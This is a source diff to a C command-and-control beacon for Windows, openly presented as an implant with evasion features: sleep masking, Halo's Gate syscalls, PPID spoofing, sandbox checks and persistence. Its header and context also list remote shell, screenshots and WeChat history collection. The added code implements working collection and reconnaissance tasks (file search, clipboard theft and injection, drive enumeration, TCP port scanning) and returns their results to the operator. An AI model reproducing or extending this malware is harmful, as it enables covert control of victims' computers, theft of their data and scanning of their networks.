@@ -9,19 +9,20 @@
  *   4. encrypted frames {uuid,seq,ts,c} with c = b64(nonce12||AES-GCM(inner)),
  *      AAD = uuid || 0x00 || seq_ascii. Inner body is PLAIN JSON (the server
  *      accepts unmarked JSON; no cbor/msgpack needed).
- *   5. tasks: shell/ps/ls/read/hostinfo/set_sleep/beacon_now/kill/
- *      download/upload (+ process_tree alias), services/reg_get/reg_set/
+ *   5. tasks: shell/ps/ls/read/hostinfo/set_sleep/get_sleep_mode/beacon_now/
+ *      kill/download/upload (+ process_tree alias), services/reg_get/reg_set/
  *      reg_delete/killproc/suspend/resume/reboot/shutdown/persistence_add/
  *      persistence_list/persistence_remove/window_list/window_close,
  *      screenshot/screenshot_window/screen_stream_start/screen_stream_stop/
- *      remote_input, with per-task enc decryption (AES-GCM,
+ *      remote_input, drives/find/clipboard_get/clipboard_set/portscan,
+ *      with per-task enc decryption (AES-GCM,
  *      AAD uuid\\0taskID) and base64 results. Streaming emits one JPEG
  *      screen_frame per beacon while enabled (dirty-frame dedup).
  *
- * Build (mingw-w64):
- *   x86_64-w64-mingw32-gcc -O2 -o cbeacon.exe beacon.c crypto_cng.c ^
- *     -lwinhttp -lbcrypt -D C2_HOST="..." -D C2_PORT=... ^
- *     -D SECRET_ID="..." -D SECRET_B64="..."
+ * Build (mingw-w64): see build.bat / build-release.bat / build-e2e-local.bat -
+ * they carry the full source list and the exact library set (the portscan task
+ * uses winsock2, so -lws2_32 is required; dnsapi is only needed when
+ * dns_transport.c is compiled with -DC2_TRANSPORT_DNS).
  *
  * This is a PROTOTYPE: HTTP only. Evasion: XOR+NOACCESS sleep mask with
  * Halo's-Gate NtDelayExecution, PPID-spoofed shell spawn, startup sandbox
@@ -29,6 +30,11 @@
  * Identity (UUID + X25519 key) persists in %TEMP%\\fc2c.dat.
  */
 #define _CRT_SECURE_NO_WARNINGS
+/* winsock2.h must precede windows.h: windows.h pulls the legacy winsock.h and
+ * the two definition sets then conflict. The socket stack is only used by the
+ * portscan task, and WSAStartup happens on first use (see ensure_winsock). */
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <tlhelp32.h>
@@ -2854,6 +2860,425 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
     return out;
 }
 
+/* ---------- recon / collection parity tasks (Go task_recon.go) ----------
+ * drives, find, clipboard_get, clipboard_set, portscan and get_sleep_mode.
+ * The result text keeps the Go line grammars (tab-separated, "\n" joined,
+ * empty output = no hits) so the console and the UI read the same on both
+ * implants. Where the C implant has no equivalent concept the answer reports
+ * what this implant actually does instead of inventing one: get_sleep_mode
+ * prints the interval/jitter pair set_sleep writes (Go reports a mode name).
+ */
+#define FIND_MAX_HITS 500
+#define FIND_MAX_DEPTH 16
+#define CLIP_MAX_BYTES (1024u * 1024u)
+#define SCAN_MAX_TARGETS 4096
+#define SCAN_TIMEOUT_MS 2000
+#define RECON_BUF_CAP (256u * 1024u)
+
+static unsigned char ascii_lower(unsigned char c) {
+    return (c >= 'A' && c <= 'Z') ? (unsigned char)(c - 'A' + 'a') : c;
+}
+
+/* Case-insensitive '*'/'?' match over a basename: Go matches with
+ * filepath.Match, which on Windows is case-insensitive too. A real glob
+ * language ([a-z], escapes) is out of scope for the prototype. */
+static int wildcard_match(const char *pat, const char *name) {
+    while (*pat) {
+        if (*pat == '*') {
+            pat++;
+            if (!*pat) return 1;
+            while (*name) {
+                if (wildcard_match(pat, name)) return 1;
+                name++;
+            }
+            return wildcard_match(pat, name);
+        }
+        if (!*name) return 0;
+        if (*pat != '?' && ascii_lower((unsigned char)*pat) != ascii_lower((unsigned char)*name)) return 0;
+        pat++;
+        name++;
+    }
+    return *name == '\0';
+}
+
+/* Winsock comes up on first use: the beacon itself speaks WinHTTP, so a
+ * session that never scans pays nothing. */
+static int ensure_winsock(void) {
+    static int state = 0; /* 0 = untried, 1 = up, -1 = failed */
+    if (state == 0) {
+        WSADATA wsa;
+        state = (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) ? 1 : -1;
+    }
+    return (state == 1) ? 0 : -1;
+}
+
+/* drives: the Go side shells out to PowerShell/WMI; this is the native
+ * equivalent with the same columns, one tab-separated line per root. */
+static char *do_drives(DWORD *outlen) {
+    const size_t cap = 8192;
+    char roots[512];
+    char *buf = (char *)malloc(cap);
+    size_t len = 0;
+    DWORD n;
+    const char *p;
+    if (!buf) return NULL;
+    len = (size_t)_snprintf(buf, cap, "Drive\tType\tFree\tTotal\n");
+    n = GetLogicalDriveStringsA(sizeof(roots) - 1, roots);
+    if (n == 0 || n >= sizeof(roots)) {
+        len += (size_t)_snprintf(buf + len, cap - len, "ERROR: cannot enumerate drives (%lu)\n", GetLastError());
+        if (outlen) *outlen = (DWORD)len;
+        return buf;
+    }
+    for (p = roots; *p; p += strlen(p) + 1) {
+        const char *type;
+        ULARGE_INTEGER avail, total, totalFree;
+        char freebuf[32], totbuf[32];
+        int wrote;
+        if (len + 160 >= cap) break;
+        switch (GetDriveTypeA(p)) {
+        case DRIVE_FIXED: type = "fixed"; break;
+        case DRIVE_REMOVABLE: type = "removable"; break;
+        case DRIVE_REMOTE: type = "network"; break;
+        case DRIVE_CDROM: type = "cdrom"; break;
+        case DRIVE_RAMDISK: type = "ram"; break;
+        default: type = "unknown"; break;
+        }
+        avail.QuadPart = 0;
+        total.QuadPart = 0;
+        totalFree.QuadPart = 0;
+        if (GetDiskFreeSpaceExA(p, &avail, &total, &totalFree)) {
+            _snprintf(freebuf, sizeof(freebuf), "%.1f GB", (double)avail.QuadPart / 1073741824.0);
+            _snprintf(totbuf, sizeof(totbuf), "%.1f GB", (double)total.QuadPart / 1073741824.0);
+        } else {
+            strcpy_s(freebuf, sizeof(freebuf), "n/a");
+            strcpy_s(totbuf, sizeof(totbuf), "n/a");
+        }
+        wrote = _snprintf(buf + len, cap - len, "%s\t%s\t%s\t%s\n", p, type, freebuf, totbuf);
+        if (wrote <= 0) break;
+        len += (size_t)wrote;
+    }
+    if (outlen) *outlen = (DWORD)len;
+    return buf;
+}
+
+/* UTF-16 text -> UTF-8 (allocated), capped so a hostile/huge clipboard cannot
+ * cost the beacon unbounded memory. *outlen excludes the NUL. */
+static char *utf16_to_utf8_alloc(const WCHAR *w, DWORD *outlen, const char **err) {
+    int need = WideCharToMultiByte(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
+    char *out;
+    int n;
+    if (need <= 0) {
+        if (err) *err = "clipboard text is not valid UTF-16";
+        return NULL;
+    }
+    if ((DWORD)(need - 1) > CLIP_MAX_BYTES) {
+        if (err) *err = "clipboard text is larger than 1 MiB";
+        return NULL;
+    }
+    out = (char *)malloc((size_t)need);
+    if (!out) {
+        if (err) *err = "out of memory";
+        return NULL;
+    }
+    n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, need, NULL, NULL);
+    if (n <= 0) {
+        free(out);
+        if (err) *err = "clipboard text is not valid UTF-16";
+        return NULL;
+    }
+    if (outlen) *outlen = (DWORD)(n - 1); /* n counts the terminating NUL */
+    return out;
+}
+
+/* Legacy CF_TEXT clipboards hold ANSI (CP_ACP); convert via UTF-16 so the
+ * result matches what the UTF-16 path produces. */
+static char *ansi_to_utf8_alloc(const char *ansi, DWORD *outlen, const char **err) {
+    int wneed = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
+    WCHAR *w;
+    char *out;
+    if (wneed <= 0) {
+        if (err) *err = "clipboard text is not valid ANSI";
+        return NULL;
+    }
+    w = (WCHAR *)malloc((size_t)wneed * sizeof(WCHAR));
+    if (!w) {
+        if (err) *err = "out of memory";
+        return NULL;
+    }
+    if (MultiByteToWideChar(CP_ACP, 0, ansi, -1, w, wneed) <= 0) {
+        free(w);
+        if (err) *err = "clipboard text is not valid ANSI";
+        return NULL;
+    }
+    out = utf16_to_utf8_alloc(w, outlen, err);
+    free(w);
+    return out;
+}
+
+static char *do_clipboard_get(DWORD *outlen, const char **err) {
+    char *out = NULL;
+    if (!OpenClipboard(NULL)) {
+        if (err) *err = "cannot open the clipboard";
+        return NULL;
+    }
+    if (err) *err = "clipboard holds no text";
+    {
+        HANDLE h = GetClipboardData(CF_UNICODETEXT);
+        if (h) {
+            const WCHAR *w = (const WCHAR *)GlobalLock(h);
+            if (w) {
+                out = utf16_to_utf8_alloc(w, outlen, err);
+                GlobalUnlock(h);
+            }
+        } else if ((h = GetClipboardData(CF_TEXT)) != NULL) {
+            const char *s = (const char *)GlobalLock(h);
+            if (s) {
+                out = ansi_to_utf8_alloc(s, outlen, err);
+                GlobalUnlock(h);
+            }
+        }
+    }
+    CloseClipboard();
+    return out;
+}
+
+static int do_clipboard_set(const char *text) {
+    int wneed = MultiByteToWideChar(CP_UTF8, 0, text, -1, NULL, 0);
+    HGLOBAL mem;
+    WCHAR *w;
+    if (wneed <= 0) return -1;
+    mem = GlobalAlloc(GMEM_MOVEABLE, (SIZE_T)wneed * sizeof(WCHAR));
+    if (!mem) return -1;
+    w = (WCHAR *)GlobalLock(mem);
+    if (!w) {
+        GlobalFree(mem);
+        return -1;
+    }
+    if (MultiByteToWideChar(CP_UTF8, 0, text, -1, w, wneed) <= 0) {
+        GlobalUnlock(mem);
+        GlobalFree(mem);
+        return -1;
+    }
+    GlobalUnlock(mem);
+    if (!OpenClipboard(NULL)) {
+        GlobalFree(mem);
+        return -1;
+    }
+    if (!EmptyClipboard() || !SetClipboardData(CF_UNICODETEXT, mem)) {
+        CloseClipboard();
+        GlobalFree(mem); /* ownership only transfers with a successful set */
+        return -1;
+    }
+    CloseClipboard();
+    return 0;
+}
+
+/* find: recursive walk, one line per hit in the Go format
+ * "<path>\t<size>\t<YYYY-MM-DD HH:MM>". Bounded on purpose: at most
+ * FIND_MAX_HITS hits and FIND_MAX_DEPTH levels, reparse points are not
+ * followed (junction loops would run forever) and the truncation is printed
+ * instead of silently dropping matches. */
+static void find_append(char *buf, size_t cap, size_t *len, const char *full, const WIN32_FIND_DATAA *fd) {
+    FILETIME local;
+    SYSTEMTIME st;
+    unsigned long long sz = ((unsigned long long)fd->nFileSizeHigh << 32) | fd->nFileSizeLow;
+    if (*len + 160 >= cap) return;
+    if (!FileTimeToLocalFileTime(&fd->ftLastWriteTime, &local) || !FileTimeToSystemTime(&local, &st)) {
+        *len += (size_t)_snprintf(buf + *len, cap - *len, "%s\t%llu\t-\n", full, sz);
+        return;
+    }
+    *len += (size_t)_snprintf(buf + *len, cap - *len, "%s\t%llu\t%04d-%02d-%02d %02d:%02d\n",
+        full, sz, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
+}
+
+static void find_walk(const char *dir, const char *pattern, int depth,
+                      char *buf, size_t cap, size_t *len, int *hits, int *capped) {
+    char pat[MAX_PATH * 2];
+    WIN32_FIND_DATAA fd;
+    HANDLE h;
+    size_t dlen;
+    int slashed;
+    if (*capped || depth > FIND_MAX_DEPTH) return;
+    dlen = strlen(dir);
+    slashed = (dlen > 0 && (dir[dlen - 1] == '\\' || dir[dlen - 1] == '/'));
+    _snprintf(pat, sizeof(pat), "%s%s*", dir, slashed ? "" : "\\");
+    h = FindFirstFileA(pat, &fd);
+    if (h == INVALID_HANDLE_VALUE) return;
+    do {
+        char full[MAX_PATH * 2];
+        int isdir;
+        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == '\0' ||
+            (fd.cFileName[1] == '.' && fd.cFileName[2] == '\0'))) continue;
+        _snprintf(full, sizeof(full), "%s%s%s", dir, slashed ? "" : "\\", fd.cFileName);
+        isdir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
+        if (!pattern || !pattern[0] || wildcard_match(pattern, fd.cFileName)) {
+            find_append(buf, cap, len, full, &fd);
+            if (++(*hits) >= FIND_MAX_HITS) {
+                *capped = 1;
+                break;
+            }
+        }
+        if (isdir && !(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
+            find_walk(full, pattern, depth + 1, buf, cap, len, hits, capped);
+            if (*capped) break;
+        }
+    } while (FindNextFileA(h, &fd));
+    FindClose(h);
+}
+
+static char *do_find(const char *root, const char *pattern, DWORD *outlen) {
+    const char *dir = (root && root[0]) ? root : ".";
+    char *buf = (char *)malloc(RECON_BUF_CAP);
+    size_t len = 0;
+    int hits = 0, capped = 0;
+    if (!buf) return NULL;
+    find_walk(dir, pattern ? pattern : "", 0, buf, RECON_BUF_CAP, &len, &hits, &capped);
+    if (capped) {
+        len += (size_t)_snprintf(buf + len, RECON_BUF_CAP - len,
+            "(truncated: first %d matches of this pattern; narrow the search)\n", FIND_MAX_HITS);
+    }
+    buf[len] = '\0';
+    if (outlen) *outlen = (DWORD)len;
+    return buf;
+}
+
+/* Copy the next comma-separated token (trimmed) into out; returns the pointer
+ * after that token's comma, or NULL when the list is exhausted. */
+static const char *scan_next_token(const char *list, char *out, size_t cap) {
+    const char *start = list;
+    const char *end;
+    size_t n;
+    while (*start == ' ' || *start == '\t') start++;
+    end = start;
+    while (*end && *end != ',') end++;
+    n = (size_t)(end - start);
+    while (n > 0 && (start[n - 1] == ' ' || start[n - 1] == '\t')) n--;
+    if (n >= cap) n = cap - 1;
+    memcpy(out, start, n);
+    out[n] = '\0';
+    return (*end == ',') ? end + 1 : NULL;
+}
+
+/* One TCP connect with the Go implant's 2s budget: non-blocking connect plus
+ * select, so a filtered port cannot stall the beacon loop. */
+static int scan_tcp_connect(const char *host, const char *port) {
+    struct addrinfo hints;
+    struct addrinfo *res = NULL, *it;
+    int ok = -1;
+    if (ensure_winsock() != 0) return -1;
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
+    for (it = res; it && ok != 0; it = it->ai_next) {
+        u_long nonblock = 1;
+        SOCKET s = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
+        int rc;
+        if (s == INVALID_SOCKET) continue;
+        ioctlsocket(s, FIONBIO, &nonblock);
+        rc = connect(s, it->ai_addr, (int)it->ai_addrlen);
+        if (rc == 0) {
+            ok = 0;
+        } else {
+            int werr = WSAGetLastError();
+            if (werr == WSAEWOULDBLOCK || werr == WSAEINPROGRESS || werr == WSAEINVAL) {
+                fd_set wf;
+                struct timeval tv;
+                FD_ZERO(&wf);
+                FD_SET(s, &wf);
+                tv.tv_sec = SCAN_TIMEOUT_MS / 1000;
+                tv.tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000;
+                if (select(0, NULL, &wf, NULL, &tv) > 0) {
+                    int soerr = 0;
+                    int slen = sizeof(soerr);
+                    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&soerr, &slen) == 0 && soerr == 0) ok = 0;
+                }
+            }
+        }
+        closesocket(s);
+    }
+    freeaddrinfo(res);
+    return ok;
+}
+
+/* portscan: Go's "ip1,ip2:port1,port2", one "<host>:<port> open|closed" line
+ * per combination. tcp only: the Go udp path is meaningless (a UDP "connect"
+ * never tells you the port state), so the request is refused with that reason
+ * instead of reporting a fake answer. */
+static char *do_portscan(const char *spec, const char *mode, DWORD *outlen, const char **err) {
+    char *copy;
+    char *ips;
+    char *ports;
+    char *buf;
+    size_t len = 0;
+    const char *colon;
+    const char *icur;
+    int combos = 0;
+    if (mode && mode[0] && strcmp(mode, "tcp") != 0) {
+        if (err) *err = "portscan: only tcp is implemented in the C implant (udp refused)";
+        return NULL;
+    }
+    if (!spec || !*spec) {
+        if (err) *err = "format: ip:ports or ip1,ip2:port1,port2";
+        return NULL;
+    }
+    colon = strchr(spec, ':');
+    if (!colon) {
+        if (err) *err = "format: ip:ports or ip1,ip2:port1,port2";
+        return NULL;
+    }
+    copy = _strdup(spec);
+    if (!copy) {
+        if (err) *err = "out of memory";
+        return NULL;
+    }
+    ips = copy;
+    ports = copy + (size_t)(colon - spec) + 1;
+    *(ports - 1) = '\0';
+    if (ensure_winsock() != 0) {
+        free(copy);
+        if (err) *err = "portscan: winsock is unavailable";
+        return NULL;
+    }
+    buf = (char *)malloc(RECON_BUF_CAP);
+    if (!buf) {
+        free(copy);
+        if (err) *err = "out of memory";
+        return NULL;
+    }
+    icur = ips;
+    while (icur) {
+        char ipbuf[128];
+        const char *pcur;
+        icur = scan_next_token(icur, ipbuf, sizeof(ipbuf));
+        if (!ipbuf[0]) continue;
+        pcur = ports;
+        while (pcur) {
+            char portbuf[32];
+            const char *host = strchr(ipbuf, ':') ? "[" : "";
+            const char *hostend = strchr(ipbuf, ':') ? "]" : "";
+            int open;
+            pcur = scan_next_token(pcur, portbuf, sizeof(portbuf));
+            if (!portbuf[0]) continue;
+            if (++combos > SCAN_MAX_TARGETS) {
+                free(buf);
+                free(copy);
+                if (err) *err = "portscan: too many targets (limit 4096 host:port pairs)";
+                return NULL;
+            }
+            if (len + 160 >= RECON_BUF_CAP) break;
+            open = (scan_tcp_connect(ipbuf, portbuf) == 0);
+            len += (size_t)_snprintf(buf + len, RECON_BUF_CAP - len, "%s%s%s:%s %s\n",
+                host, ipbuf, hostend, portbuf, open ? "open" : "closed");
+        }
+    }
+    free(copy);
+    buf[len] = '\0';
+    if (outlen) *outlen = (DWORD)len;
+    return buf;
+}
+
 int main(void) {
     fprintf(stderr, "[cbeacon] enter\n");
     BYTE shared[32], sesskey[32];
@@ -3520,6 +3945,59 @@ int main(void) {
                                                     free(out);
                                                 }
                                                 if (!robj) robj = emit_error_result(t.id, "remote_input", err ? err : "remote_input failed", rid);
+                                            } else if (strcmp(t.type, "drives") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = do_drives(&olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "drives", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "drives", "drive enumeration failed", rid);
+                                            } else if (strcmp(t.type, "find") == 0) {
+                                                const char *root = (t.path && t.path[0]) ? t.path : NULL;
+                                                DWORD olen = 0;
+                                                char *out = do_find(root, t.command, &olen);
+                                                if (out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, "find", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "find", "find failed", rid);
+                                            } else if (strcmp(t.type, "clipboard_get") == 0) {
+                                                const char *cerr = NULL;
+                                                DWORD olen = 0;
+                                                char *out = do_clipboard_get(&olen, &cerr);
+                                                if (out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, "clipboard_get", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "clipboard_get", cerr ? cerr : "clipboard read failed", rid);
+                                            } else if (strcmp(t.type, "clipboard_set") == 0) {
+                                                const char *txt = (t.command && t.command[0]) ? t.command
+                                                    : ((t.data && t.data[0]) ? t.data : NULL);
+                                                if (!txt) {
+                                                    robj = emit_error_result(t.id, "clipboard_set", "clipboard_set: text required", rid);
+                                                } else if (do_clipboard_set(txt) == 0) {
+                                                    robj = emit_text_result(t.id, "clipboard_set", "clipboard set", rid);
+                                                } else {
+                                                    robj = emit_error_result(t.id, "clipboard_set", "clipboard set failed", rid);
+                                                }
+                                            } else if (strcmp(t.type, "portscan") == 0) {
+                                                const char *serr = NULL;
+                                                DWORD olen = 0;
+                                                char *out = do_portscan(t.command, t.shell, &olen, &serr);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "portscan", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "portscan", serr ? serr : "portscan failed", rid);
+                                            } else if (strcmp(t.type, "get_sleep_mode") == 0) {
+                                                char msg[128];
+                                                _snprintf(msg, sizeof(msg), "sleep interval %d s, jitter %d%%", g_interval, g_jitter);
+                                                robj = emit_text_result(t.id, "get_sleep_mode", msg, rid);
                                             } else {
                                                 char msg[128];
                                                 _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
